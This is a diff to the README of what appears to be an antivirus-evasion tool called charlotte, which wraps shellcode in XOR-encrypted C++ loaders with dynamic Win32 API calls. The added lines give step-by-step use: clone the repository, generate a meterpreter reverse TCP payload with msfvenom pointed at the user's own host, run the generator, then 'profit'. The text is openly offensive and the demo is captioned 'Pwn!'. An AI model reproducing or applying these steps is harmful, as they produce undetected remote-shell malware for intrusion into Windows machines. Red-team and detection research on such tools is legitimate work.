@@ -8,7 +8,7 @@
 2. dynamic invoking of win32 api functions
 3. XOR encryption of shellcode and function names
 4. randomised XOR keys and variables per run
-5. on Kali Linux, simply 'apt-get install apt-get install mingw-w64**' and thats it!
+5. on Kali Linux, simply 'apt-get install mingw-w64*' and thats it!
 
 
 ## antiscan.me
@@ -19,7 +19,14 @@
 
 git clone the repository, generate your shellcode file with the naming beacon.bin, and run charlotte.py
 
-tested with msfvenom -p (shown in the .gif POC below) and also cobalt strike raw format payload
+example:
+1. git clone https://github.com/9emin1/charlotte.git && apt-get install mingw-w64*
+2. cd charlotte
+3. msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$YOUR_IP LPORT=$YOUR_PORT -f raw > beacon.bin
+4. python charlotte.py
+5. profit
+
+### tested with msfvenom -p (shown in the .gif POC below) and also cobalt strike raw format payload
 
 ![alt_text](demo-poc.gif "Pwn!")
 
